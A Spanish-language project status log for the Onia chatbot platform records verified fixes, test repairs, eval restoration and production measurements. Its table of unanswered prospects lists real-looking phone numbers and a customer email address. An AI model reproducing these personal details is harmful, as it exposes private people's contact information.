      ✅ **Cerrado el 2026-09-02, auditando este mismo `[x]`.** Acá quedaba escrito un `docker exec
      … psql` "para el próximo Gate 1 que toque `/inbox` o S7/S8" — o sea, **a nadie**. Es el molde
      con el que S16 venció en silencio: lo declarado no lo corre nadie. Ese comando ahora es
      `npm run inbox:tenencia` (`scripts/inbox_tenencia.mjs`), cableado a `npm test` por su
      self-check, y mide además un segundo invariante que este párrafo no tenía: que **dos orgs no
      reclamen el mismo inbox**, cosa que la base no impide (`chatwootInboxId` es `Int?` sin
      `@unique`; el 409 vive sólo en la app, y la escritura del 1-sep no pasó por la app).
      La lección que sí seguía valiendo y ahora la aplica el gate solo: **mirar el `id` de la fila
      antes de asumir que fue un click** — un UUID significa escritura por fuera de la app, un
      `cuid()` significa que la escribió la app. El gate lo reporta pero nunca lo usa de veredicto,
      porque hoy la fila **correcta** también tiene id UUID.

- [x] **S11 era un FANTASMA: el bot ya firma como "Onia Bot" desde el 18-ago, y la bandeja ya
      rotula "Tu asistente".** Estaba en "Bloqueado en Sergio" pidiéndole una acción sobre un
      bot vivo que no habría cambiado nada — el molde exacto que este carril mide, y del tipo
      caro: uno que hace poner las manos en producción.
      **Por qué el diagnóstico original se equivocó, que es lo que hay que no repetir.** El
      Radar §11 decía *"de los mensajes salientes de las conversaciones 11, 35 y 37, los 8
      tienen `sender_id = 2` y ninguno el 3"*. Medido hoy en la base de Chatwoot, eso es cierto
      **y no prueba lo que se le hizo probar**: los 8 son TODOS de la conv 11 y van del
      **6-ago al 15-ago** — las convs 35 y 37 aportan **cero** salientes (son dos de los cuatro
      desconocidos que nadie contestó, S7). O sea que se midió una conversación cuyo último
      mensaje es **anterior** al día en que la variable empezó a hacer efecto, y de ahí se
      concluyó cómo se comporta el bot hoy.
      **Y el síntoma "MIRADO" era real pero histórico.** La conv 11 (+591 71606892) sí se pinta
      entera como "Vos", y va a seguir así para siempre: esos mensajes **de verdad** los posteó
      la cuenta 2. Mirar la pantalla fue correcto; mirar una conversación vieja para juzgar el
      comportamiento actual es lo que falló.
      **El estado real, medido en producción y no leído** (base de Chatwoot + env del proceso
      que CORRE, no `docker exec printenv`, que arranca un proceso nuevo con el env base del
      contenedor y no el del `docker exec -d` que levantó el bot):
      | qué | medido |
      |---|---|
      | `CHATWOOT_BOT_AGENT_ID` del proceso del bot (`/proc/400019/environ`) | **3** |
      | persistido en `/opt/onia/bot/webhook.env` (lo sourcea `webhook-server.sh:134`) | **sí** — sobrevive al reinicio |
      | `messages` salientes con `sender_id = 3` | **13, del 18-ago al 31-ago** |
      | `messages` salientes con `sender_id = 2` | 14, del 26-jul al 30-ago — es Sergio a mano, que es lo correcto |
      | `CHATWOOT_BOT_USER_ID` en el proceso de `onia-platform` | **no seteada** ⇒ `botUserId()` cae a su default **3** (`lib/chatbot/bandeja.ts:118`) |
      Bot postea 3, bandeja busca 3 ⇒ `de = "bot"` ⇒ **"Tu asistente"**
      (`InboxClient.tsx:52`). La clasificación es función pura y está cubierta:
      `npx vitest run lib/chatbot/bandeja.test.ts` → **13/13**, con el caso
      *"outgoing de OTRO agente = negocio (el dueño contestando)"*.
      **Lo que NO se hizo, dicho y no simulado:** no se re-MIRÓ `/inbox` renderizado — necesita
      base + sesión del dueño. Se dice porque la regla del carril es mirar; acá la evidencia
      medida es **más fuerte que la captura**, porque una captura de la conv 11 es exactamente
      lo que produjo la conclusión equivocada. Lo que faltaría mirar es una conversación
      **posterior al 18-ago** (la 44 sirve: saliente con `sender_id = 3` del 31-ago).
      📎 **La trampa que queda viva y por la que esto podría volver:** los dos lados tienen
      defaults **distintos** — el bot cae a **2** (`webhook-server.sh:149`,
      `${CHATWOOT_BOT_AGENT_ID:-2}`) y la plataforma a **3**. Hoy no molesta porque la variable
      está en `webhook.env`; el día que esa línea se borre, el bot vuelve a firmar como Sergio,
      **toda la bandeja se re-rotula "Vos" en silencio** y además se apaga la detección de
      traspaso (con la variable vacía `takeoverTurn` devuelve `null` y el bot deja de callarse
      cuando el dueño contesta). **No se "arregló" cambiando el default a 3 a propósito:**
      tocar ese fallback cambia el comportamiento de un servicio vivo y necesita deploy — o sea
      Sergio— y el riesgo del inbox 3 del Radar §11 sigue sin verificarse. Queda escrito acá,
      que es lo que cuesta cero y evita el próximo diagnóstico al revés.

> **Siete de estos eran pendientes vivos en el handoff y ya estaban hechos.** Se verificaron
> uno por uno contra el código de hoy, no contra el handoff. Cada uno lleva su prueba: si
> alguien los vuelve a abrir, que sea contra el archivo, no contra la memoria.

**Cerrado en esta vuelta (2026-08-31):**

- [x] **Arrastrado del ítem 1: dos huecos de plataforma — LOS TRES cerrados, y el tercero
      lo cerró otro carril hace una hora.** Gate 1 del 2026-08-31 (sexta vuelta) contra el
      código de HOY, no contra el texto del ítem:
      1. ✅ **CSP:** `onia-platform/next.config.ts:18` deriva el esquema del websocket del
         de la URL — `${url.protocol === "https:" ? "wss" : "ws"}://${url.host}`. Era el
         arreglo de este mismo carril y sigue en pie.
      2. ✅ **eslint no entra a los worktrees:** `package.json:10` →
         `"lint": "eslint --ignore-pattern \".claude/**\""`. La raíz de verdad
         (`globalIgnores` de `eslint.config.mjs`, que sigue listando sólo `.next/**`) NO se
         tocó y NO hace falta: el script ya la tapa, y editar ese archivo lo bloquea el hook
         `config-protection`. Se deja de arrastrar.
      3. ✅ **El test inestable dejó de serlo:** commit `e644c85` de `onia-platform`
         (31-ago 19:35) — *"la guarda del gate de lint fallaba al azar y volvia el gate
         inservible"*. La causa que encontró es la que este carril sospechaba y mejor
         medida: la primera `isPathIgnored` carga el flat config entero (~1,7 s en reposo,
         ~8 s con la suite en paralelo) contra un default de vitest de 5 s. **Corrido hoy:**
         `npx vitest run __tests__/eslint-no-lintea-worktrees.test.ts` → **4 passed**, 6,88 s.
      **Por qué se cierra y no se deja "por las dudas":** el ítem existía para dejar escritos
      dos huecos ajenos con su prueba. Los dos se arreglaron y el tercero también. Un ítem
      abierto cuyo contenido ya está hecho es el fantasma exacto que este carril mide.


- [x] **`recepcionista.test.mjs` estaba COMMITEADO CON 0 BYTES — un test que no podía fallar.**
      Gate 1 confirmó que era real, no fantasma: `wc -c` daba **0** y `git show HEAD:…` también,
      desde `3e3841aa`. `node --test` lo cargaba, no encontraba ningún caso y lo contaba como
      éxito: **silencio sumando a la cuenta de verdes**, que es la enfermedad medida de este
      carril.
      **De los dos caminos que la cola daba (borrarlo o llenarlo) se eligió llenarlo, y el
      motivo es un hueco real, no una preferencia.** Grep sobre TODA la suite antes de escribir:
      `faqNegocioVigente` aparecía **cero veces** — y es la FAQ que **edita el dueño** desde el
      panel, o sea el único matcher del bot que un cliente cambia sin que nadie le revise el
      regex. `catalogoCliente` y `botonesRecepcion`, también cero. El GUION en cambio ya está
      cubierto por `bot-engine.test.mjs` §8/§8b **por el motor real**, que es más señal que
      cualquier stub: eso no se duplicó.
      **20 tests**, sobre lo que nadie miraba:
      - **fail-closed de vigencia**: una FAQ con vencimiento y sin fecha de mensaje NO se sirve.
        Estaba documentado en el código y no probado.
      - **el matcher que edita el dueño**: palabra entera ("iva" no salta en "activa"), piso de
        3 letras, y **los metacaracteres del tag escapados** — sin eso un tag `2.5` matchea
        "245" y un tag con `.` contesta CUALQUIER mensaje: una FAQ que responde a todo.
      - `id !== "negocio"` ignorado (las FAQ de Onia no se sirven en boca del cliente), entradas
        basura sin explotar, y que se recorren TODAS las FAQ y no sólo la primera.
      - `catalogoCliente`: descarta lo que no tiene nombre, no deja el guion colgando sin
        `queResuelve`, y devuelve `""` — que es lo que hace derivar a R_NO_DATO.
      - `botonesRecepcion`: 3 botones y **≤20 caracteres, que es límite de META**: pasarse no da
        error visible, WhatsApp rechaza el interactivo y el cliente se queda sin menú.
      **Probado que los tests PUEDEN fallar, que es lo que le faltaba al archivo de 0 bytes.**
      Cinco mutaciones a `recepcionista.mjs`, una por una, revirtiendo entre cada una — sin
      escapar metacaracteres, sin el piso de 3 letras, sin el filtro de `id`, sin descartar
      productos sin nombre, y truncando el botón largo en vez de caer al genérico: **las cinco
      dieron rojo**. Suite del bot **654/654** (634 antes: el archivo aportaba 0).
      ⚠️ **Un test mío salió mal y el error vale más que el test:** el de fail-closed pasaba
      `undefined` a través de un helper con valor por defecto, así que **disparaba el default y
      verificaba lo contrario en verde**. Se corrigió llamando la función directo, y quedó el
      comentario en el archivo — es exactamente el molde del test que no puede fallar.
      ⚠️ **Consecuencia para el espejo, dicha y no escondida:** el archivo ahora es DISTINTO del
      VPS (allá sigue en 0 bytes), así que `espejo-check.mjs` lo reporta — correctamente. Es el
      único archivo del veredicto; entra en el próximo `scp` del directorio. No cambia nada de
      lo que corre: es un test.

- [x] **Los 12 evals del bot estaban MUERTOS hace días y la cola reportaba "634/634 verde".**
      Encontrado en el Gate 1 de esta vuelta corriendo la suite, no leyéndola: `node --test`
      daba **635 tests, 634 pass, 1 fail**. El que fallaba era
      `hermes-content/deploy/vps-ops/bot/evals/evals.test.mjs`, y no fallaba un caso: **no
      cargaba el módulo**. `SyntaxError: The requested module '../run-turn.mjs' does not
      provide an export named 'LLM_SYSTEM_PROMPT'`.
      **La causa, con su commit.** `git log -S` lo señala solo: el export desapareció en
      **`d334d776`** — *"el espejo del motor quedó 25 archivos atrás del VPS"*—, la
      sincronización que trajo al repo la versión del VPS, donde el prompt estaba **inlineado**
      dentro de `askLiteLLM`. El texto nunca se perdió (es byte a byte el mismo); lo que se
      perdió fue el `export`, y con él la única forma que tenían los evals de importarlo.
      **Por qué nadie lo vio en tres vueltas.** Un archivo que no carga lo reporta `node --test`
      como **UN test roto entre 634 verdes**. Tres vueltas seguidas escribieron "634/634",
      "626/626", "619/619" leyendo el `pass` y no el `fail`. El costo real: los 12 evals que
      miden que el bot **no cotiza precios, no promete y deriva al humano** no corrían desde
      `d334d776` — justo los graders que cuidan la parte cara.
      **Lo que se hizo** — lo mínimo, sin cambiar una coma del comportamiento:
      `run-turn.mjs` vuelve a exportar `LLM_SYSTEM_PROMPT` como constante y `askLiteLLM` la
      usa (`const system = LLM_SYSTEM_PROMPT`), exactamente como antes de `d334d776`.
      **La prueba de que sirve, corrida:** los 12 evals ahora CORREN y dan
      **PASS 11/11 · 1 no corrida** — E12 (`modelo_real`) queda sin correr a propósito, porque
      llama al modelo pago y **ese gasto lo aprueba Sergio**.
      **Su guardia, y por qué no es un test de adorno:** el primer intento importaba la
      constante por nombre en `run-turn.test.mjs`, y al quitar el export **fallaba igual de
      silencioso** — se caía el módulo entero. Se cambió a `import * as runTurnModule`, así que
      ahora rompe **por su nombre**, con el motivo escrito, y los otros 8 tests del archivo
      siguen pasando. Verificado en los dos sentidos: con el export → verde; revirtiendo
      `run-turn.mjs` a `HEAD` → `✖ el prompt del LLM sigue exportado — si se inlinea, los evals
      dejan de correr en silencio`, `pass 8 · fail 1`.
      **Suite del bot: 647/647, `fail 0`** (antes: 635 con 1 en rojo).
      🔗 Es el **tercer** episodio del mismo agujero — espejo del repo vs `/opt/onia/bot` — y
      el primero descubierto por un gate y no de casualidad. Por eso en esta misma vuelta se
      commitea `hermes-content/deploy/vps-ops/bot/espejo-check.mjs`, que la vuelta anterior
      dejó **sin commitear** (estaba `??` en `git status`).

- [x] **v6.8 — recorrida de fricción completa.** Hecha el 2026-08-31 sobre las dos pantallas
      que el ítem nombra, con la sesión del dueño de `Ferreteria Circuito Completo` (la org
      vinculada al inbox 5), en escritorio **y** en móvil (375×812), MIRANDO capturas. La
      recorrida encontró **una cosa rota de verdad, que se arregló en la misma vuelta**, y
      corrigió dos de los tres roces que el propio ítem traía anotados.
      **Lo roto, y arreglado** (`onia-platform`, commit `fdcb3df`, mergeado a `master` y
      pusheado): **el globo verde de no-leídos no bajaba nunca.** `unread_count` sale de
      `agent_last_seen_at` de Chatwoot, y lo único que movía esa columna era la UI de Chatwoot
      — que el dueño no usa. Medido en la base de producción ANTES de tocar: de las 8
      conversaciones de los inboxes 4 y 5, **siete tenían `agent_last_seen_at` en NULL**.
      Ahora abrir la conversación llama a `update_last_seen` (después del guard de tenencia, y
      en `try/catch`: leer es lo que no puede romperse) y el cliente relee la lista una vez para
      que el globo baje sin esperar los 15 s del poll. Verificado MIRANDO contra el Chatwoot de
      producción: abrir la conversación 11 le sacó el globo en pantalla **mientras las otras dos
      lo conservan**, y su `agent_last_seen_at` quedó con la hora del click. Las de desconocidos
      (35 y 37) no se tocaron a propósito: S7 las espera sin leer.
      **Corrección al roce 2 del propio ítem — era fantasma, y de los caros.** Decía que "el
      buscador dice *Buscar pacientes…* en una ferretería" y sonaba a texto dental hardcodeado.
      No lo es: `Header.tsx:28` y `Sidebar.tsx:53` YA leen `vocabularioDeTrack(...)`, y lo que
      faltaba era el flag. Con `PLATFORM_LAYER=1` — que es **el valor de producción**, leído con
      `docker inspect onia-platform` — la misma pantalla dice **"Buscar productos…"** y el menú
      pasa de `Pacientes · Cobros · Reportes` a **`Catálogo · Inventario · Caja`**. MIRADO en las
      dos configuraciones. El roce existía sólo en local, por una variable que faltaba en
      `.env.local`. **El roce 1 (la barra del admin encimada) NO se re-verificó**: vive en
      `/admin/organizations/<id>`, que no es ninguna de las dos pantallas que este ítem nombra.
      Queda como estaba — pero ojo, nació con el mismo entorno sin flag que produjo el roce 2, así
      que antes de perseguirlo conviene volver a mirarlo con `PLATFORM_LAYER=1`.
      **Un roce nuevo, MIRADO:** al entrar a `/inbox` el modal **"Primeros pasos"** se abre encima
      y tapa la lista entera de conversaciones; hay que cerrarlo para ver quién escribió. Es el
      checklist de alta (`components/onboarding/GuiaInicio`), y aparece incluso con conversaciones
      esperando.
      **Lo que la recorrida NO pudo cerrar, y quedó anotado en su lugar:** "La cita" le habla de
      consultorio a una ferretería incluso con el flag puesto (ficha nueva en "Después", es del
      carril de plataforma), y el bot firma **"Vos"** en vez de "Tu asistente" (**S11** + radar §11).
      🔴 **Corregido el 2026-08-31: lo del "Vos" era un fantasma y la recorrida lo dio por roto
      mirando la conv 11, que es de antes del 18-ago.** El bot ya firma como "Onia Bot"
      (`sender_id = 3`) y la bandeja ya rotula "Tu asistente". Ver S11 en "Cerrado".
      **Dos trampas nuevas del entorno**, que van a costar una vuelta a quien las repita y por eso
      se escriben: `npm run build` usa Turbopack y **no emite `.next/standalone`** — para poder
      levantar el producto hay que correr `next build --webpack`, que es además lo que
      `next.config.ts` declara como build de deploy; y ese build **exige `ENCRYPTION_KEY`** o
      muere en "Failed to collect page data for /api/gateway-config/test". Las dos van a la skill
      `onia-verificacion`.

- [x] **1 · Contar si un desconocido YA escribió.** Contado contra las dos bases, no contra el
      handoff. **La respuesta es SÍ: cinco desconocidos, y ninguno se ve en `/inbox`.**
      **El número.** La cuenta 2 de Chatwoot tiene hoy **22 conversaciones**, no 26 — el
      handoff (`hermes-content/docs/handoff/chatbot.md:142`) traía un número viejo. Repartidas
      en cuatro inboxes: 3 `ONIA Demo` (8, todas pruebas nuestras de julio), 4 `Onia Web` (5),
      5 `Onia WhatsApp` (3), 7 `ZZ QA Clinica Chatbot` (6, todas QA).
      **Los cinco desconocidos**, con la evidencia que los distingue de una prueba nuestra —
      `additional_attributes` de cada conversación, que guarda dispositivo y referer:
      | conv | inbox | quién | cuándo | qué escribió | ¿le contestaron? |
      |---|---|---|---|---|---|
      | 34 | 4 web | iPhone/Safari, referer `onia.com.bo/comparativa` | 24-ago | "hola" | no |
      | 35 | 5 WhatsApp | +591 73232758 | 25-ago | *"estoy evaluando un sistema de gestión para una clínica odontológica de 4 doctores…"* | **no** |
      | 36 | 4 web | iPad/Google Search App, referer `onia.com.bo` | 27-ago | "Quiero información" + dejó su correo `Saguilera@ds-santacruz.bo` | no |
      | 37 | 5 WhatsApp | +591 73021804 | 28-ago | *"Hola, vengo de la web de Onia. Quiero saber si me sirve para mi negocio."* | **no** |
      | 40 | 4 web | iPhone/**Instagram**, referer `onia.com.bo` | 29-ago | "Ajajajajaj" → *"0 ni una reunión"* | sí |
      **Por qué cuatro de cinco quedaron sin respuesta, y por qué NO es un bug nuevo.** Los
      cuatro (34, 35, 36, 37) tienen **cero filas** en `onia_center.bot_messages`: el motor
      nunca los vio. Sus fechas — 24, 25, 27 y 28 de agosto — caen exactamente dentro de la
      caída de cuatro días que ya está cerrada más abajo. Desde el 29-ago el motor procesa
      normal (conv 38 y 40 sí tienen sus filas). **La caída ya tiene su precio medido: cuatro
      personas reales.** No se abre ítem por esto; la causa está auto-curada en
      `hermes-content/deploy/vps-ops/bot/webhook-watchdog.sh`.
      **Y el inbox.** Ninguno de los dos inboxes donde escribieron (4 y 5) es el
      `chatwootInboxId` de ninguna org — la única org con inbox es la de QA. O sea que **aunque
      el motor hubiera estado vivo, esas conversaciones tampoco se habrían visto en `/inbox`**.
      Eso es el ítem 1 de Ahora, y esta medición es su prueba.
      ⚠️ Sólo lectura, como pedía el ítem: no se borró ni se respondió nada. Contestarles es
      decisión de Sergio — anotado como S7 en Bloqueado.

**Los siete fantasmas** (el handoff los seguía listando como pendientes):

- [x] **Los DOS "fixes de fondo del motor" del 23-ago** que el handoff decía que "siguen
      esperando su sesión". Los dos están puestos: el timestamp en el arranque vive en
      `hermes-content/deploy/vps-ops/bot/webhook-server.mjs:542-545` (con el comentario que
      cita el pedido de los dos handoffs), y `markMessageDelivered` en el turno normal está
      en `hermes-content/deploy/vps-ops/bot/chatwoot-adapter.mjs:733-737` — se cerró como
      PIEZA 4 el 29-ago y el handoff lo arrastró igual en "Próximos pasos".
- [x] **"Decisión: FAQ genérica por cliente (`id:"negocio"`)"**, listada como pendiente de
      Sergio. Está viva y contestando desde el 28-ago:
      `hermes-content/deploy/vps-ops/bot/knowledge.mjs:66` mapea `negocio → R_FAQ_NEGOCIO`,
      con su guardarraíl de palabras disparadoras en la línea 394.
- [x] **"¿Cablear la alerta del watchdog a Telegram?"**, listada como decisión pendiente.
      Ya está cableada: `hermes-content/deploy/vps-ops/bot/webhook-watchdog.sh` avisa bot
      caído y BOT MUDO hacia Chatwoot (1 aviso por incidente + recuperación).
- [x] **"Pantalla del dueño para su canal, sin pasar por el superadmin"** (Próximos pasos 2).
      Es la pieza 3 del 29-ago: `app/(dashboard)/settings/chatbot/CanalWebCard.tsx` con el
      botón de encendido y el snippet, sobre `lib/chatbot/canal-web.ts`.
- [x] **"Siembra con datos reales + bench de humo"** (Próximos pasos 1). El bench existe y da
      6/6: `hermes-content/deploy/vps-ops/bot/humo-plantillas.mjs` con su fixture
      `hermes-content/deploy/vps-ops/bot/plantillas-humo.json`; la plantilla bebe el horario
      real de la org desde `lib/chatbot/plantillas.ts`.
- [x] **"Limpieza de data QA (conversaciones 29/31/32/33, inbox 6, filas sintéticas)"**,
      listada como pendiente de coordinar con Sergio. **Ejecutada el 29-ago 00:40 con su
      aprobación**: 10 conversaciones + el inbox 6 huérfano destruidos por rails, 12
      `bot_conversations` y 52 `bot_messages` sintéticos borrados, backups CSV en
      `/opt/onia/backups/db/qa-limpieza-20260829-003953/`. La data QA que quedó es
      **posterior** — está en Después.
- [x] **"Pricing: ¿existe un escalón más barato sólo widget web, sin WhatsApp?"**. Sergio lo
      decidió el 30-ago: **OPCIÓN A, Bs 390 plano todo incluido**, ratificado y sin cambio de
      código porque `lib/pricing.ts:23` ya lo tenía (`entryMonthly: 390`, `annualTotal: 3900`).
      La comparativa que sostiene la decisión: `hermes-content/docs/ONIA_PRICING_CHATBOT_PROPUESTA.md`.

**Lo construido y verificado en producción** (resumen; el detalle largo vive en el handoff):

- [x] Editor del chatbot **pre-armado por rubro** (`lib/chatbot/plantillas.ts`, 19 tests) +
      el bug de UI que dejaba el nombre del servicio en 26px.
- [x] **Bandeja nativa `/inbox`** viva: backend (`lib/chatbot/bandeja.ts`,
      `lib/chatbot/bandeja-auth.ts`, `app/api/bandeja/route.ts`), pantalla
      (`app/(dashboard)/inbox/InboxClient.tsx`), tenencia revalidada fila por fila, y el
      **candado bot-humano** con armado y desarme.
- [x] **Multimedia** en la bandeja, **visión LLM** (`hermes-content/deploy/vps-ops/bot/vision.mjs`,
      US$ 0,0007 por imagen) y **detector de comprobantes** — que jamás confirma un pago.
- [x] **Editor conversacional** "Enséñale conversando"
      (`app/(dashboard)/settings/chatbot/EnsenaleConversando.tsx` +
      `lib/chatbot/editor-conversacional.ts` + `hermes-content/deploy/vps-ops/bot/editor-sugerir.mjs`).
- [x] **Insistencia** con perilla en el panel y barrido por cron
      (`hermes-content/deploy/vps-ops/bot/insistencia-run.mjs`), **push "te escribieron"**
      (`lib/chatbot/push-te-escribieron.ts`) y **frases de campaña** (deploy `e5c1ad3`).
- [x] **El motor estuvo caído 4 días** (24 al 28-ago) y volvió: `/tmp/onia-bot` a medias +
      la excepción de firewall perdida en el reboot. Las dos causas están auto-curadas desde
      `hermes-content/deploy/vps-ops/bot/webhook-watchdog.sh`.
- [x] **Canario de auth** cada 5 min, **n8n saneado** (4 workflows con claves vivas
      redactados y archivados, 27 inactivos archivados) y el **webhook de Cal.com
      despublicado** — estaba huérfano y aceptaba POSTs forjados.
      🔴 **De esta línea SE SACÓ "Branding de Chatwoot completo (seis configs)" el 2026-08-31
      (séptima vuelta): era falso, y medido desde la calle.** Un `[x]` que dice *completo*
      sobre algo que está roto en producción es el fantasma exacto que este carril mide, y
      éste llevaba **quince días**. No son seis configs sino nueve, y tres —`BRAND_URL`,
      `TERMS_URL`, `PRIVACY_URL`— dicen `www.chatwoot.com` en el HTML público de
      `https://chat.onia.com.bo/app/login` desde el **16-ago**. Verificado hoy con un `curl`
      a la página, no leyendo la base:
      `"BRAND_URL":"https://www.chatwoot.com"`. La parte que SÍ está bien y por eso no se
      borra entera: logo, `BRAND_NAME`, `INSTALLATION_NAME` y el `WIDGET_BRAND_URL` del pie
      del widget siguen siendo los de Onia. **Lo pendiente vive en el ítem de "Después"
      (`Vigilar que el reconcile…`) y en S10**, que es donde tiene que estar mientras siga
      roto.

---

## Rechazado, con motivo — no volver a proponerlo

- **Difusiones masivas** (el último hueco contra Sendy). Necesita plantillas de Meta
  **aprobadas por cada org** y tiene costo por mensaje a partir del 1-oct-2026, cuando se
  cierra la ventana gratis de 24 h. Construirlo sin un cliente que lo pida es especificar a
  ciegas un flujo cuyo costo todavía no conocemos. **Se reabre el día que un cliente lo pida**,
  y ahí se especifica con su caso.
- **Un escalón de precio más barato "sólo widget web"**. Ya decidido: Bs 390 plano todo
  incluido (`lib/pricing.ts:23`). Reabrirlo es desandar una decisión de Sergio del 30-ago
  tomada con la comparativa de mercado en la mano.
- **Apagar los workflows de n8n que avisan por Telegram.** Hacen trabajo real: apagarlos para
  bajar ruido rompe la automatización para arreglar una notificación. Lo que corresponde es
  editar el nodo de aviso de cada uno — y eso espera la decisión S5.
- **Un modelo local para la visión del bot.** Sergio ya lo descartó el 30-ago con el motivo
  escrito: *"pagamos api nomás de modelo barato"* — ollama ya estranguló el VPS una vez
  (steal 93%, load 158). El costo medido de la API es US$ 0,0007 por imagen.
